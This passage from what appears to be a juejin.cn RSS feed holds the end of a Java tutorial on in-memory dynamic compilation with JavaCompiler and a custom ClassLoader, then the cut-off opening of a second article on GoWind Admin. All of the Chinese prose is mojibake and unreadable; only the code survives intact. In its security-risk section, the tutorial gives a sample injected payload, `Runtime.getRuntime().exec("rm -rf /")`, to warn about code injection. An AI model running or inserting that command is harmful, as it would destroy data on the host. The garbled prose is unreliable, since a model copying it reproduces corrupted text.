    Class&lt;?&gt; clazz = loader.loadClass(<span class="hljs-string">"DynamicController"</span>);
    
    <span class="hljs-comment">// æ³¨å†Œåˆ° Spring</span>
    <span class="hljs-comment">// ...ï¼ˆçœç•¥æ³¨å†Œé€»è¾‘ï¼‰</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Controller å·²åŠ è½½ï¼Œæ— éœ€é‡å¯ï¼"</span>;
}
</code></pre>
<p><strong>æƒ³è±¡ä¸€ä¸‹</strong>ï¼š</p>
<pre><code class="hljs">ä¸é‡å¯æœåŠ¡å™¨
å‘é€ä¸€æ®µä»£ç 
æ–°åŠŸèƒ½ç«‹åˆ»ç”Ÿæ•ˆ
</code></pre>
<p>å¬èµ·æ¥å¾ˆé…·ï¼Ÿ</p>
<h3 data-id="heading-13">è­¦å‘Šï¼šåƒä¸‡åˆ«åœ¨çº¿ä¸Šç”¨</h3>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ï¼Ÿ</strong></p>
<h4 data-id="heading-14">é£é™©ä¸€ï¼šç±»æ³„æ¼å¯¼è‡´ OOM</h4>
<pre><code class="hljs">æ¯æ¬¡åŠ è½½ç”Ÿæˆæ–°ç±»
ä¸é‡Šæ”¾ä¼šå æ»¡ Metaspace
æœ€ç»ˆ OutOfMemoryError
</code></pre>
<p><strong>çœŸå®æ¡ˆä¾‹</strong>ï¼šæŸå›¢é˜Ÿåœ¨çº¿ä¸Šä½¿ç”¨ç±»ä¼¼æœºåˆ¶çƒ­æ›´æ–°ä¸šåŠ¡è§„åˆ™ï¼Œå› ç±»åŠ è½½å™¨æ³„æ¼æœªåŠæ—¶æ¸…ç†ï¼Œ72 å°æ—¶å Metaspace å æ»¡ï¼ŒFull GC é¢‘å‘ï¼ŒæœåŠ¡é›ªå´©ã€‚</p>
<p><strong>ç›‘æ§</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">jmap -clstats &lt;pid&gt; | grep Script_

è¾“å‡ºï¼š
Script_1702345678
Script_1702345679
Script_1702345680
...
Script_1702399999  <span class="hljs-comment"># å‡ ä¸‡ä¸ªç±»ï¼</span>
</code></pre>
<h4 data-id="heading-15">é£é™©äºŒï¼šå®‰å…¨æ¼æ´</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·æäº¤æ¶æ„ä»£ç </span>
<span class="hljs-type">String</span> <span class="hljs-variable">maliciousCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">"System.exit(0)"</span>;
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-type">String</span> <span class="hljs-variable">maliciousCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Runtime.getRuntime().exec(\"rm -rf /\")"</span>;

<span class="hljs-comment">// ä½ çš„æœåŠ¡ï¼šç›´æ¥æŒ‚äº†</span>
</code></pre>
<h4 data-id="heading-16">é£é™©ä¸‰ï¼šç¼–è¯‘è€—æ—¶å½±å“æ€§èƒ½</h4>
<pre><code class="hljs">JavaCompiler ç¼–è¯‘ä¸€æ¬¡ï¼š100-200ms
é«˜å¹¶å‘ä¸‹ï¼šæ‰€æœ‰è¯·æ±‚éƒ½åœ¨ç­‰ç¼–è¯‘
æœåŠ¡å“åº”å˜æ…¢
</code></pre>
<h4 data-id="heading-17">é£é™©å››ï¼šéš¾ä»¥è¿½è¸ªå’Œè°ƒè¯•</h4>
<pre><code class="hljs">çº¿ä¸Šå‡ºäº†é—®é¢˜
çœ‹æ—¥å¿—ï¼šScript_1702345678 æŠ¥é”™
å»å“ªæ‰¾è¿™ä¸ªç±»çš„ä»£ç ï¼Ÿ
å·²ç»ä¸åœ¨äº†ï¼Œåªåœ¨å†…å­˜é‡Œå­˜åœ¨è¿‡
</code></pre>
<h3 data-id="heading-18">å¯¹çº¿ä¸Šè¦æœ‰æ•¬ç•ä¹‹å¿ƒ</h3>
<pre><code class="hljs language-diff" lang="diff">åŠ¨æ€ç¼–è¯‘å¾ˆå¼ºå¤§
ä½†ä¹Ÿå¾ˆå±é™©

çº¿ä¸Šç¯å¢ƒï¼š
<span class="hljs-deletion">- ç¨³å®šå‹å€’ä¸€åˆ‡</span>
<span class="hljs-deletion">- å¯è¿½æº¯å‹å€’ä¸€åˆ‡</span>
<span class="hljs-deletion">- å®‰å…¨å‹å€’ä¸€åˆ‡</span>

è¿™ç§é»‘ç§‘æŠ€ï¼š
<span class="hljs-deletion">- å­¦ä¹ å¯ä»¥</span>
<span class="hljs-deletion">- æœ¬åœ°ç©å¯ä»¥</span>
<span class="hljs-deletion">- çº¿ä¸Šç»å¯¹ä¸è¡Œ</span>
</code></pre>
<p><strong>æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">éœ€è¦åŠ¨æ€èƒ½åŠ›ï¼Ÿ
<span class="hljs-deletion">- ç”¨é…ç½®ä¸­å¿ƒï¼ˆApolloã€Nacosï¼‰</span>
<span class="hljs-deletion">- ç”¨è§„åˆ™å¼•æ“ï¼ˆDroolsã€QLExpressï¼‰</span>
<span class="hljs-deletion">- ç”¨è„šæœ¬å¼•æ“ï¼ˆä½†è¦æ²™ç®±éš”ç¦»ï¼‰</span>
<span class="hljs-deletion">- ç”¨æ’ä»¶ç³»ç»Ÿï¼ˆOSGiã€JPMSï¼‰</span>

éœ€è¦çƒ­éƒ¨ç½²ï¼Ÿ
<span class="hljs-deletion">- ç”¨ç°åº¦å‘å¸ƒ</span>
<span class="hljs-deletion">- ç”¨è“ç»¿éƒ¨ç½²</span>
<span class="hljs-deletion">- ç”¨æ»šåŠ¨æ›´æ–°</span>
</code></pre>
<p><strong>å®‰å…¨ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<p>è¿™é¡¹æŠ€æœ¯å¹¶éä¸€æ— æ˜¯å¤„ï¼Œåœ¨å¯æ§ç¯å¢ƒä¸‹æœ‰å…¶ä»·å€¼ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">é€‚åˆä½¿ç”¨ï¼š
<span class="hljs-deletion">- æœ¬åœ°è°ƒè¯•è„šæœ¬</span>
<span class="hljs-deletion">- è§„åˆ™æµ‹è¯•æ²™ç®±</span>
<span class="hljs-deletion">- æ•™å­¦æ¼”ç¤ºç³»ç»Ÿ</span>
<span class="hljs-deletion">- ä½é¢‘é…ç½®çƒ­åŠ è½½ï¼ˆé…åˆä¸¥æ ¼ç™½åå•ï¼‰</span>
<span class="hljs-deletion">- å†…éƒ¨å·¥å…·å¹³å°ï¼ˆéæ ¸å¿ƒä¸šåŠ¡ï¼‰</span>

å‰ææ¡ä»¶ï¼š
<span class="hljs-deletion">- ä¸¥æ ¼çš„æƒé™æ§åˆ¶</span>
<span class="hljs-deletion">- å®Œå–„çš„ç›‘æ§å‘Šè­¦</span>
<span class="hljs-deletion">- æ¸…æ™°çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†</span>
<span class="hljs-deletion">- å®šæœŸçš„ç±»åŠ è½½å™¨æ¸…ç†</span>
</code></pre>
<hr/>
<h2 data-id="heading-19">ä¸ƒã€å®Œæ•´æµ‹è¯•</h2>
<h3 data-id="heading-20">æµ‹è¯•ä»£ç </h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">DynamicScriptRunner</span> <span class="hljs-variable">runner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicScriptRunner</span>();
        runner.register(<span class="hljs-string">"MyMath"</span>, MyMath.class);
        runner.getContext().put(<span class="hljs-string">"amount"</span>, <span class="hljs-number">150.0</span>);
        
        test(runner, <span class="hljs-string">"2 + 3 * 4"</span>);
        test(runner, <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>);
        test(runner, <span class="hljs-string">"MyMath.discount(100, 0.8)"</span>);
        test(runner, <span class="hljs-string">"if (amount &gt; 100) MyMath.discount(amount, 0.8)"</span>);
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(DynamicScriptRunner runner, String script)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> runner.execute(script);
        System.out.println(<span class="hljs-string">"Result: "</span> + result);
    }
}
</code></pre>
<h3 data-id="heading-21">æµ‹è¯•è¾“å‡º</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Result: 14.0</span>
<span class="hljs-section">Result: 120.0</span>
<span class="hljs-section">Result: 80.0</span>
<span class="hljs-section">Result: 120.0</span>
</code></pre>
<p><strong>éªŒè¯</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¿è¡Œæ—¶æŸ¥çœ‹åŠ è½½çš„ç±»</span>
jps
jmap -clstats &lt;pid&gt; | grep Script_

<span class="hljs-comment"># åº”è¯¥çœ‹åˆ°</span>
Script_1702345678
Script_1702345679
Script_1702345680
Script_1702345681

<span class="hljs-comment"># æ¯æ¬¡æ‰§è¡Œç”Ÿæˆä¸€ä¸ªæ–°ç±»</span>
</code></pre>
<hr/>
<h2 data-id="heading-22">å…«ã€æ ¸å¿ƒä»£ç å±•ç¤º</h2>
<h3 data-id="heading-23">DynamicScriptRunner ä¸»å…¥å£</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicScriptRunner</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Context</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">InMemoryCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryCompiler</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(String name, Class&lt;?&gt; clazz)</span> {
        context.registerFunction(name, clazz);
    }
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String script)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. ç”Ÿæˆå”¯ä¸€ç±»å</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Script_"</span> + System.currentTimeMillis();
        
        <span class="hljs-comment">// 2. åŒ…è£…æˆ Java æºç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">javaSource</span> <span class="hljs-operator">=</span> wrapScript(className, script);
        
        <span class="hljs-comment">// 3. åŠ¨æ€ç¼–è¯‘</span>
        <span class="hljs-type">byte</span>[] classBytes = compiler.compile(className, javaSource);
        
        <span class="hljs-comment">// 4. åŠ è½½ç±»</span>
        <span class="hljs-type">ScriptClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptClassLoader</span>();
        loader.defineClass(className, classBytes);
        Class&lt;?&gt; scriptClass = loader.loadClass(className);
        
        <span class="hljs-comment">// 5. åå°„æ‰§è¡Œ</span>
        <span class="hljs-type">Method</span> <span class="hljs-variable">executeMethod</span> <span class="hljs-operator">=</span> scriptClass.getMethod(<span class="hljs-string">"execute"</span>, Map.class, Map.class);
        <span class="hljs-keyword">return</span> executeMethod.invoke(<span class="hljs-literal">null</span>, context.getVariables(), context.getFunctions());
    }
    
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">wrapScript</span><span class="hljs-params">(String className, String script)</span> {
        <span class="hljs-comment">// åŒ…è£…é€»è¾‘ï¼ˆå‰é¢å·²å±•ç¤ºï¼‰</span>
    }
}
</code></pre>
<h3 data-id="heading-24">InMemoryCompiler ç¼–è¯‘å™¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InMemoryCompiler</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] compile(String className, String javaSource) <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">JavaCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> ToolProvider.getSystemJavaCompiler();
        
        DiagnosticCollector&lt;JavaFileObject&gt; diagnostics = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiagnosticCollector</span>&lt;&gt;();
        <span class="hljs-type">InMemoryFileManager</span> <span class="hljs-variable">fileManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryFileManager</span>(
            compiler.getStandardFileManager(diagnostics, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)
        );
        
        <span class="hljs-type">JavaFileObject</span> <span class="hljs-variable">sourceFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringSourceJavaFileObject</span>(className, javaSource);
        
        JavaCompiler.<span class="hljs-type">CompilationTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> compiler.getTask(
            <span class="hljs-literal">null</span>, fileManager, diagnostics, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, Arrays.asList(sourceFile)
        );
        
        <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> task.call();
        
        <span class="hljs-keyword">if</span> (!success) {
            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">errors</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
            <span class="hljs-keyword">for</span> (Diagnostic&lt;?&gt; d : diagnostics.getDiagnostics()) {
                errors.append(d.getMessage(<span class="hljs-literal">null</span>)).append(<span class="hljs-string">"\n"</span>);
            }
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ç¼–è¯‘å¤±è´¥:\n"</span> + errors);
        }
        
        <span class="hljs-keyword">return</span> fileManager.getCompiledClass(className);
    }
}
</code></pre>
<h3 data-id="heading-25">ScriptClassLoader ç±»åŠ è½½å™¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScriptClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> {
    
    <span class="hljs-keyword">private</span> Map&lt;String, <span class="hljs-type">byte</span>[]&gt; classBytesMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineClass</span><span class="hljs-params">(String className, <span class="hljs-type">byte</span>[] classBytes)</span> {
        classBytesMap.put(className, classBytes);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException {
        <span class="hljs-type">byte</span>[] classBytes = classBytesMap.get(name);
        <span class="hljs-keyword">if</span> (classBytes != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);
        }
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-26">ä¹ã€æ€»ç»“</h2>
<h3 data-id="heading-27">æ ¸å¿ƒæœºåˆ¶</h3>
<p>åŠ¨æ€ç¼–è¯‘æ‰§è¡Œçš„æœ¬è´¨æ˜¯ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è„šæœ¬åŒ…è£…æˆå®Œæ•´ Java ç±»
<span class="hljs-bullet">2.</span> JavaCompiler åŠ¨æ€ç¼–è¯‘ï¼ˆJDK åŸç”Ÿèƒ½åŠ›ï¼‰
<span class="hljs-bullet">3.</span> InMemoryFileManager æ‹¦æˆªè¾“å‡ºåˆ°å†…å­˜
<span class="hljs-bullet">4.</span> ScriptClassLoader ä»å†…å­˜åŠ è½½å­—èŠ‚ç 
<span class="hljs-bullet">5.</span> åå°„è°ƒç”¨æ‰§è¡Œ
</code></pre>
<p><strong>é›¶ä¾èµ–å®ç°</strong>ï¼šå…¨ç¨‹åªä½¿ç”¨ JDK è‡ªå¸¦çš„ <code>javax.tools.JavaCompiler</code> å’Œæ ‡å‡† ClassLoaderï¼Œæ— éœ€å¼•å…¥ä»»ä½•ç¬¬ä¸‰æ–¹åŒ…ã€‚</p>
<h3 data-id="heading-28">å…³é”®æŠ€æœ¯ç‚¹</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> JavaCompiler APIï¼šJDK è‡ªå¸¦çš„åŠ¨æ€ç¼–è¯‘å·¥å…·
<span class="hljs-bullet">2.</span> FileManager æœºåˆ¶ï¼šæ‹¦æˆªç¼–è¯‘è¾“å‡ºï¼ˆJDK ç¼–è¯‘å™¨ SPI æ¥å£ï¼‰
<span class="hljs-bullet">3.</span> ClassLoader æœºåˆ¶ï¼šä»å†…å­˜åŠ è½½å­—èŠ‚ç 
<span class="hljs-bullet">4.</span> defineClass æ–¹æ³•ï¼šå­—èŠ‚ç æ•°ç»„ â†’ Class å¯¹è±¡
<span class="hljs-bullet">5.</span> åå°„è°ƒç”¨ï¼šæ‰§è¡Œç”Ÿæˆçš„ç±»
</code></pre>
<h3 data-id="heading-29">ä¸ QLExpress çš„æ ¸å¿ƒå·®å¼‚</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">QLExpressï¼š
  ç”¨ Java ä»£ç æ¨¡æ‹Ÿ <span class="hljs-keyword">if</span>
  ä¸ç”Ÿæˆ <span class="hljs-keyword">class</span>
  
<span class="hljs-title class_">MiniGroovy</span>ï¼š
  ç”ŸæˆçœŸæ­£çš„ JVM <span class="hljs-keyword">if</span> æŒ‡ä»¤
  ä¼šç”Ÿæˆ <span class="hljs-keyword">class</span>ï¼ˆåœ¨å†…å­˜é‡Œï¼‰
</code></pre>
<h3 data-id="heading-30">å­¦åˆ°äº†ä»€ä¹ˆ</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åŠ¨æ€ç¼–è¯‘ä¸ç¥ç§˜ï¼ŒJavaCompiler å°±èƒ½åš
<span class="hljs-bullet">2.</span> class æ–‡ä»¶å¯ä»¥åªåœ¨å†…å­˜é‡Œå­˜åœ¨
<span class="hljs-bullet">3.</span> ClassLoader å¯ä»¥ä»å†…å­˜åŠ è½½å­—èŠ‚ç 
<span class="hljs-bullet">4.</span> å¼ºå¤§çš„æŠ€æœ¯è¦è°¨æ…ä½¿ç”¨
<span class="hljs-bullet">5.</span> å¯¹çº¿ä¸Šè¦æœ‰æ•¬ç•ä¹‹å¿ƒ
</code></pre>
<hr/>
<h2 data-id="heading-31">å†™åœ¨æœ€å</h2>
<p>æ‹†äº†ä¸¤ä¸ªè½®å­ï¼š</p>
<p><strong>ä¸Šä¸€ç¯‡ QLExpress</strong>ï¼š</p>
<ul>
<li>ä¸ç”Ÿæˆ class</li>
<li>ç”¨ Java ä»£ç æ¨¡æ‹Ÿæ‰§è¡Œ</li>
<li>è½»é‡ã€å¿«é€Ÿ</li>
</ul>
<p><strong>æœ¬ç¯‡åŠ¨æ€ç¼–è¯‘æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>åŠ¨æ€ç¼–è¯‘ç”Ÿæˆ class</li>
<li>çœŸæ­£çš„ JVM å­—èŠ‚ç </li>
<li>å¼ºå¤§ã€çµæ´»</li>
</ul>
<p>è¿™å¥—æœºåˆ¶å°±æ˜¯ Groovyã€JSR-223 ScriptEngine ç­‰å·¥å…·çš„åº•å±‚åŸç†ã€‚ç†è§£äº†å®ƒï¼Œå°±ç†è§£äº† Java ä¸–ç•Œé‡ŒåŠ¨æ€èƒ½åŠ›çš„æœ¬è´¨ã€‚</p>
<p>[æœ¬æ–‡ä»£ç ] (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fsh_wangwanbao%2Fql-express-mini-groovy" target="_blank" title="https://gitee.com/sh_wangwanbao/ql-express-mini-groovy" ref="nofollow noopener noreferrer">gitee.com/sh_wangwanbâ€¦</a>)</p>
<p>ä¸‹ä¸€ç¯‡è®¡åˆ’ï¼šæ·±å…¥å¯¹æ¯”è¿™ä¸¤ç§æ–¹æ¡ˆï¼Œè®²æ¸…æ¥šä»€ä¹ˆåœºæ™¯ç”¨å“ªä¸ªã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šæé€Ÿæ­å»ºå¾®æœåŠ¡åº”ç”¨]]></title>    <link>https://juejin.cn/post/7583324039302119475</link>    <guid>https://juejin.cn/post/7583324039302119475</guid>    <pubDate>2025-12-14T06:25:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583324039302119475" data-draft-id="7583242257371103259" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šæé€Ÿæ­å»ºå¾®æœåŠ¡åº”ç”¨"/> <meta itemprop="keywords" content="åç«¯,å¾®æœåŠ¡,Go"/> <meta itemprop="datePublished" content="2025-12-14T06:25:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–µä¸ªå’ª"/> <meta itemprop="url" content="https://juejin.cn/user/1350630784901262"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šæé€Ÿæ­å»ºå¾®æœåŠ¡åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1350630784901262/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–µä¸ªå’ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T06:25:52.000Z" title="Sun Dec 14 2025 06:25:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    26
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šæé€Ÿæ­å»ºå¾®æœåŠ¡åº”ç”¨</h2>
